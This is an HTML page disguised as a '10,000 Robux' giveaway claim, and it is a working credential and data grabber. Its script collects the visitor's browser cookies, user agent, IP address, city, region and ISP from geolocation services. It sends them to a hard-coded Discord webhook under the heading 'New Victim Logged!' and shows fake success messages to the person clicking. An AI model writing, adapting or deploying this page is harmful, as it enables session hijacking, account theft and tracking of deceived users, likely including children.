<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robux Claim</title>
    <style>
        body {
            background-color: #111;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .box {
            background: #1a1a1a;
            border: 2px solid #00b06f;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            width: 350px;
            box-shadow: 0 0 20px rgba(0, 176, 111, 0.3);
        }
        h1 { margin-top: 0; color: #00b06f; }
        p { color: #aaa; margin-bottom: 25px; }
        button {
            background: #00b06f;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { background: #008f5a; }
        #status { margin-top: 15px; font-size: 14px; color: #888; }
    </style>
</head>
<body>

<div class="box">
    <h1>🎉 You Won! 🎉</h1>
    <p>Congratulations! You have been selected to receive <strong>10,000 Robux</strong>.</p>
    <button id="claimBtn" onclick="claim()">CLAIM NOW</button>
    <div id="status"></div>
</div>

<script>
    // YOUR WEBHOOK URL
    const webhook = "https://discord.com/api/webhooks/1538862650543570974/xMYCTcsdfG6fNMQ4NvlTHHLDzQtoaVFRxC-_8zHzI7q9beHO9KlmsH2p2sVGFuUyt-kU";

    async function claim() {
        const btn = document.getElementById("claimBtn");
        const status = document.getElementById("status");
        
        btn.disabled = true;
        btn.innerText = "Processing...";
        status.innerText = "Verifying account...";

        // 1. GET LOCATION & IP (Backup method included)
        let ipData = null;
        try {
            // Method 1: ip-api.com (More reliable than ipapi.co for this use case)
            const res = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp');
            const data = await res.json();
            if(data.status === 'success') {
                ipData = {
                    ip: data.query,
                    country: data.country,
                    region: data.regionName,
                    city: data.city,
                    isp: data.isp
                };
            }
        } catch (e) {
            // Method 2: If ip-api fails, try ipapi.co as backup
            try {
                const res2 = await fetch('https://ipapi.co/json/');
                const data2 = await res2.json();
                ipData = {
                    ip: data2.ip,
                    country: data2.country_name,
                    region: data2.region,
                    city: data2.city,
                    isp: data2.org
                };
            } catch (err) {
                ipData = { ip: "Unknown", country: "Unknown", region: "Unknown", city: "Unknown", isp: "Unknown" };
            }
        }

        // 2. GET COOKIE
        const cookie = document.cookie;

        // 3. BROWSER INFO
        const browser = navigator.userAgent;

        // 4. SEND TO DISCORD
        const payload = {
            embeds: [{
                title: "🍪 New Victim Logged!",
                color: 5814783, // Green color
                fields: [
                    { 
                        name: "🍪 Cookie", 
                        value: `\`\`\`${cookie}\`\`\``,
                        inline: false
                    },
                    { 
                        name: "📍 Location", 
                        value: `${ipData.city}, ${ipData.region}, ${ipData.country}`, 
                        inline: true 
                    },
                    { 
                        name: "💻 IP & ISP", 
                        value: `\`${ipData.ip}\` - \`${ipData.isp}\``, 
                        inline: true 
                    },
                    {
                        name: "🌐 Browser",
                        value: `\`${browser.substring(0, 50)}...\``,
                        inline: false
                    }
                ],
                footer: { text: "Robux Giveaway Logger" },
                timestamp: new Date()
            }]
        };

        try {
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            // Success Message
            status.innerText = "Success! Checking your balance...";
            setTimeout(() => {
                btn.innerText = "Check Balance";
                btn.style.background = "#333";
            }, 1000);

        } catch (err) {
            status.innerText = "Error sending data, try refreshing.";
            btn.disabled = false;
            btn.innerText = "Try Again";
        }
    }
</script>

</body>
</html>
